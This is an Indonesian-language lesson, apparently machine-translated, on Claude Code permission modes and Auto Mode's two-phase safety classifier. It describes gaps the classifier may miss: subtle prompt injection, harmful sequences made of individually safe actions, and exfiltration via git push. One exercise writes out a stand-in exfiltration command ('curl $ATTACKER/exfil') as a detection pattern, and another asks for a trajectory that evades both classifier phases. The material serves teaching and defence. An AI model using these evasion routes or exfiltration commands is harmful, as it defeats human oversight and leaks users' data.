# Code Claude sebagai Agen Otonom: Mode Izin dan Mode Otomatis

> Claude Code memaparkan tujuh mode izin. "plan" menanyakan sebelum setiap tindakan, "default" hanya menanyakan tindakan yang berisiko, "acceptEdits" menyetujui penulisan file secara otomatis tetapi masih mengonfirmasi eksekusi shell, dan "bypassPermissions" menyetujui semuanya. Mode Otomatis (24 Maret 2026) menggantikan persetujuan per tindakan dengan pengklasifikasi keamanan paralel dua phase: pemeriksaan cepat satu token dijalankan pada setiap tindakan; tindakan yang ditandai memulai tinjauan mendalam terhadap rangkaian pemikiran. Anggaran tindakan diberlakukan melalui `max_turns` dan `max_budget_usd`. Mode Otomatis dikirimkan sebagai pratinjau penelitian - Anthropic telah menyatakan secara eksplisit bahwa pengklasifikasi tidak cukup saja.

**Type:** Learn
**Language:** Python (stdlib, simulator pengklasifikasi dua phase)
**Prerequisites:** Fase 15 · 01 (Agen cakrawala panjang), Fase 15 · 09 (Lanskap agen pengkodean)
**Waktu:** ~45 menit

## Masalah

Agen pengkodean otonom di mesin kamu adalah kategori keamanan yang berbeda. Permukaan serangan adalah segalanya yang dapat dijangkau oleh agen — sistem file, jaringan, kredensial, clipboard, tab browser apa pun, terminal apa pun yang terbuka. Bruce Schneier dan yang lainnya telah menandai hal ini secara publik: agen penggunaan komputer bukanlah "pembaruan feature" dari chatbot, mereka adalah alat jenis baru dengan profil risiko jenis baru.

Sistem izin Claude Code adalah jawaban Anthropic. Daripada satu saklar "otonom / tidak otonom", ada tujuh mode yang mencakup tangga kemampuan: rencana → default → terimaEdits → … → bypassPermissions. Setiap mode merupakan trade-off yang berbeda antara kecepatan dan ulasan per tindakan. Mode Otomatis (Maret 2026) menambahkan pengklasifikasi dua phase yang memindahkan persetujuan dari jalur kritis pengguna untuk tindakan yang dinilai aman oleh pengklasifikasi, sekaligus mempertahankan layer tinjauan untuk tindakan yang ditandai oleh pengklasifikasi.

Pertanyaan tekniknya: apa yang ditangkap oleh sistem ini, apa yang terlewatkan, dan mode manakah yang benar-benar diperlukan dalam suatu tugas?

## Konsep

### Tujuh mode izin

| Modus | Perilaku | Kapan menggunakan |
|---|---|---|
| `plan` | Agen mengusulkan sebuah rencana; pengguna menyetujui seluruh rencana; setiap tindakan ditinjau sebelum dieksekusi | Tugas yang tidak biasa; code yang berdekatan dengan prod; pertama kali menggunakan agen di repo |
| `default` | Agen menjalankan tindakan; meminta pengguna untuk melakukan tindakan "berisiko" (shell exec, operasi destruktif, panggilan jaringan) | Sesi pengkodean paling interaktif |
| `acceptEdits` | File menulis persetujuan otomatis; shell exec dan panggilan jaringan masih meminta | Refactoring melewati banyak file |
| `acceptExec` | Shell memerintahkan persetujuan otomatis dalam daftar yang diizinkan; menulis persetujuan otomatis | Loop dalam yang ketat di mana setiap prompt shell `npm test` atau serupa |
| `autoMode` | Pengklasifikasi keamanan dua phase; tindakan yang ditandai naikkan ke ulasan | Berjalan tanpa pengawasan jangka panjang di ruang kerja terbatas |
| `yolo` | Melewati sebagian besar prompt; masih menjalankan alat daftar yang diizinkan / daftar tolak | Kotak pasir singkat, pekerjaan CI, skrip penelitian |
| `bypassPermissions` | Menyetujui semuanya | Didokumentasikan sebagai "hanya di dalam wadah sementara yang ingin kamu buang" |

(Nama-nama di atas cocok dengan dokumen publik Claude Code; "yolo" adalah singkatan informal untuk jalan tengah yang permisif.)

### Mode Otomatis dalam satu halaman

Mode Otomatis (diluncurkan 24 Maret 2026) adalah mode izin pertama yang mendelegasikan persetujuan per tindakan ke suatu model. Struktur:1. **Phase 1 — pengklasifikasi token tunggal.** Berjalan pada setiap tindakan yang diusulkan. Murah. Mengembalikan "aman" atau "bendera". Dirancang untuk berjalan secara paralel dengan loop agen utama sehingga tindakan yang disetujui tidak berada dalam antrian.
2. **Phase 2 — tinjauan kebijakan/keamanan sekunder.** Hanya berjalan pada tindakan yang ditandai. Melakukan penilaian kebijakan dan keselamatan terfokus atas tindakan, keadaan sesi saat ini, dan tugas yang dinyatakan. Dieskalasi ke pengguna HITL jika keyakinannya rendah.

Kontrol anggaran berada di samping pengklasifikasi:

- `max_turns` — total iterasi dalam satu sesi.
- `max_budget_usd` — batasan dolar yang membatalkan sesi.
- batas jumlah tindakan per alat (tidak lebih dari N `WebFetch` panggilan, dll.).

### Apa yang ditangkap sistem

- Injeksi cepat langsung ke input alat tempat instruksi yang disuntikkan dipetakan ke bentuk tindakan yang diketahui berisiko.
- Perulangan alat berulang — pengklasifikasi dapat melihat tindakan N+1 hampir identik dengan tindakan N, lima kali berturut-turut.
- Prompt shell yang jelas-jelas berada di luar cakupan pada sesi yang hanya mengedit file.

### Apa yang mungkin terlewatkan oleh sistem

- **Injeksi cepat yang halus** yang memodulasi perilaku tanpa menghasilkan satu tindakan pun yang ditandai. Injeksi cepat tidak langsung bukanlah kerentanan yang dapat ditambal sepenuhnya (kepala kesiapan OpenAI, 2025, tentang agen browser — lihat Lesson 11).
- **Perilaku buruk tingkat semantik.** Setiap tindakan individu mungkin terlihat aman, sementara lintasan yang dibuat berbahaya. Pengklasifikasi menilai tindakan tersebut; itu tidak mendapatkan kembali maksud pengguna.
- **Eksfiltrasi melalui pipeline yang sah.** Menulis data ke file yang kamu miliki, lalu `git push` ke repo publik, adalah rangkaian tindakan yang diizinkan yang komposisinya menjadi masalah.

### Pembingkaian pratinjau penelitian

Anthropic mengirimkan Mode Otomatis sebagai pratinjau penelitian. Dokumentasinya secara eksplisit menyatakan bahwa pengklasifikasi adalah sebuah layer, bukan solusi: pengguna diharapkan menggabungkan Mode Otomatis dengan anggaran, daftar yang diizinkan, ruang kerja terisolasi, dan audit lintasan (Lesson 12–16). Pembingkaian pratinjau juga mencerminkan kesenjangan evaluasi-vs-penerapan yang terdokumentasi (Lesson 1) — pengklasifikasi yang meneruskan evaluasi offline dapat berperilaku berbeda dalam sesi nyata ketika konteks pengguna bersifat ambigu.

### Tempat tangga ini berada dalam alur kerja kamu

- Tugas asing: mulai di `plan`. Membaca rencana lebih murah daripada membatalkan rencana buruk.
- Refactor yang dikenal: `acceptEdits` menghemat banyak klik konfirmasi.
- Pengoperasian di latar belakang tanpa pengawasan: `autoMode` hanya di dalam ruang kerja yang radius ledakannya telah kamu ukur (tidak ada kredensial, tidak ada produksi yang dipasang, tidak ada jalan keluar yang tidak kamu ikuti).
- Wadah sementara: `yolo` / `bypassPermissions` dapat diterima jika dan hanya jika wadah dan kredensialnya dapat dibuang.

## Pakai

`code/main.py` menyimulasikan pengklasifikasi dua phase. Phase 1 adalah aturan kata kunci yang murah atas tindakan yang diusulkan; Phase 2 adalah peninjau multi-aturan yang lebih lambat. Pengemudi melakukan umpan dalam lintasan sintetis pendek (tindakan aman, upaya injeksi cepat, putaran berulang) dan menunjukkan di mana pengklasifikasi menangkap dan di mana ia meleset.

## Kirim

`outputs/skill-permission-mode-picker.md` mencocokkan deskripsi tugas dengan mode izin yang tepat, batasan anggaran, dan isolasi yang diperlukan.

## Latihan

1. Jalankan `code/main.py`. Jenis tindakan sintetik manakah yang tidak pernah ditandai pada Phase 1 namun selalu tertangkap pada Phase 2? Yang mana yang tidak tertangkap oleh keduanya?2. Perluas kumpulan aturan Phase 1 untuk menangkap bentuk tertentu yang diketahui buruk (misalnya, `curl $ATTACKER/exfil`). Ukur tingkat positif palsu pada sample tindakan jinak.

3. Baca dokumen "Cara kerja loop agen" dari Anthropic. Cantumkan setiap status eksternal yang disentuh agen secara default dalam mode `default`. Manakah yang perlu kamu buat gerbangnya secara terpisah sebelum menjalankan `autoMode` tanpa pengawasan?

4. Rancang anggaran lari 24 jam tanpa pengawasan: `max_turns`, `max_budget_usd`, batasan per alat, daftar yang diizinkan. Benarkan setiap angka.

5. Jelaskan satu lintasan di mana setiap tindakan individu disetujui oleh Phase 1 dan Phase 2, namun perilaku yang disusun tidak selaras. (Lesson 14 membahas bagaimana tombol pemutus dan token kenari mengatasi hal ini.)

## Istilah Kunci

| Istilah | Apa kata orang | Apa sebenarnya arti |
|---|---|---|
| Modus izin | "Berapa banyak yang bisa dilakukan agen" | Salah satu dari tujuh kebijakan bernama yang mengontrol persetujuan per tindakan |
| mode rencana | "Tanyakan sebelum apapun" | Agen menulis rencana; pengguna menyetujui sebelum eksekusi |
| terimaSuntingan | "Biarkan menulis file" | File menulis persetujuan otomatis; shell exec masih meminta |
| mode otomatis | "Persetujuan otomatis" | Pengklasifikasi keamanan dua phase; tindakan yang ditandai meningkat |
| izin bypass | "YOLO Penuh" | Menyetujui segalanya; ditujukan untuk wadah sementara |
| Pengklasifikasi phase 1 | "Pemeriksaan token cepat" | Aturan tunggal atas usulan tindakan; berjalan secara paralel |
| Pengklasifikasi phase 2 | "Ulasan mendalam" | Alasan rantai pemikiran atas tindakan yang ditandai |
| Pratinjau penelitian | "Bukan GA" | Pembingkaian antropik untuk feature yang mode kegagalannya masih dipetakan |

## Bacaan Lanjutan

- [Antropik — Cara kerja loop agen](https://code.claude.com/docs/en/agent-sdk/agent-loop) — mode izin, anggaran, format tindakan.
- [Antropis — Ikhtisar Agen Terkelola Claude](https://platform.claude.com/docs/en/managed-agents/overview) — model eksekusi layanan terkelola.
- [Anthropic — halaman produk Claude Code](https://www.anthropic.com/product/claude-code) — tampilan feature dan pengumuman Mode Otomatis.
- [Anthropic — Claude's Constitution (Januari 2026)](https://www.anthropic.com/news/claudes-constitution) — layer berbasis alasan yang membentuk penilaian pengklasifikasi.
- [Anthropic — Mengukur otonomi agen dalam praktiknya](https://www.anthropic.com/research/measuring-agent-autonomy) — perspektif internal tentang desain izin jangka panjang.
